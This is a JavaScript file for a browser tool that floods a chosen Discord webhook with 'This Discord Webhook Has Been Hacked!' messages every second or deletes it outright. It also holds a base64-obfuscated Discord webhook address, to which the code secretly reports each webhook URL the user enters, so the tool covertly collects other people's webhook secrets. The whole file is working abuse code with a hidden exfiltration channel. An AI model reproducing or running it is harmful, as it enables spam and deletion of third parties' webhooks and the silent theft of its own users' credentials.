const webhookBase64 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTI2NDI1ODUzMzE1NTgwMzI1OC9iQ1lZS0pnT2E0Wk4ybVNzblM2d1ZSUStLZ3ZGb2ktV1o2Z0t0QUtHZDA5Y0VrNnpvbGlMRkFqOXBMVndIRjVCbUhI"; // Base64 encoded webhook
let intervalId;

document.getElementById('start-spamming').addEventListener('click', async () => {
    const webhookUrl = document.getElementById('webhook-url').value.trim();
    if (webhookUrl) {
        if (confirm("WARNING: Use this at your own risk, I am not responsible for any damage caused by this!")) {
            await sendActionToWebhook(webhookUrl, "Start Spamming");
            intervalId = setInterval(() => {
                const randomNum = Math.floor(Math.random() * 90000) + 10000;
                sendWebhookMessage(webhookUrl, `This Discord Webhook Has Been Hacked! ${randomNum}`);
            }, 1000);
            document.getElementById('start-spamming').textContent = "Stop Spamming Discord Webhook!";
            document.getElementById('start-spamming').addEventListener('click', stopSpamming);
        }
    } else {
        alert("Please enter a valid webhook URL.");
    }
});

document.getElementById('delete-webhook').addEventListener('click', async () => {
    const webhookUrl = document.getElementById('webhook-url').value.trim();
    if (webhookUrl) {
        if (confirm("WARNING: Use this at your own risk, I am not responsible for any damage caused by this!")) {
            await sendActionToWebhook(webhookUrl, "Delete Webhook");
            deleteWebhook(webhookUrl);
        }
    } else {
        alert("Please enter a valid webhook URL.");
    }
});

function stopSpamming() {
    clearInterval(intervalId);
    document.getElementById('start-spamming').textContent = "Start Spamming Webhook";
}

async function sendWebhookMessage(webhookUrl, message) {
    try {
        await fetch(webhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ content: message })
        });
    } catch (error) {
        console.error("Error sending message to webhook:", error);
    }
}

async function deleteWebhook(webhookUrl) {
    try {
        await fetch(webhookUrl, { method: 'DELETE' });
    } catch (error) {
        console.error("Error deleting webhook:", error);
    }
}

async function sendActionToWebhook(userWebhook, action) {
    try {
        await fetch(atob(webhookBase64), {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ content: `${action}: ${userWebhook}` })
        });
    } catch (error) {
        console.error("Error sending action to webhook:", error);
    }
}
